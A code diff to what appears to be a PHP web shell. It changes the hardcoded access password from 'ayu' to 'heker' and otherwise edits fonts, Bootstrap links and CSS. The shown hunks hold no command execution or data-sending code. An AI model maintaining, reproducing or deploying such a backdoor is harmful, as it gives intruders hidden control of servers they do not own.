@@ -34,7 +34,7 @@ $Array = [
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
-	$correctPassword = "ayu"; //Change Password
+	$correctPassword = "heker"; //Change Password
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
 
@@ -291,31 +291,16 @@ $Array = [
 		<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
 		<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css'>
 		<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css'>
-        <link href='https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Roboto+Slab:wght@600&display=swap' rel='stylesheet'>
 		<script src='https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
 		<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
 		<script src='https://code.jquery.com/jquery-3.3.1.slim.min.js'></script>
         <style>
-            .text-decoration {
-                font-family: 'Poppins', sans-serif;
-                color: white;
-                text-decoration: none;
-            }
-            .text-secondary {
-                color: #6c757d;
-            }
-            .anu {
-                color: #6c757d;
-            }
-            .corner {
-                position: relative;
-            }
-            .corner .icon {
-                position: absolute;
-                top: 50%;
-                transform: translateY(-50%);
-                margin-left: 10px;
-            }
+			@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap');
+			*
+			{
+			font-family: 'Poppins', sans-serif;
+			font-weight: 400;
+			}
         </style>
         <style>
             gr {
@@ -323,6 +308,9 @@ $Array = [
             }
             rd {
                 color: red;
+            }
+			corner {
+                position: relative;
             }
             </style>
         <body class='bg-secondary text-light'>
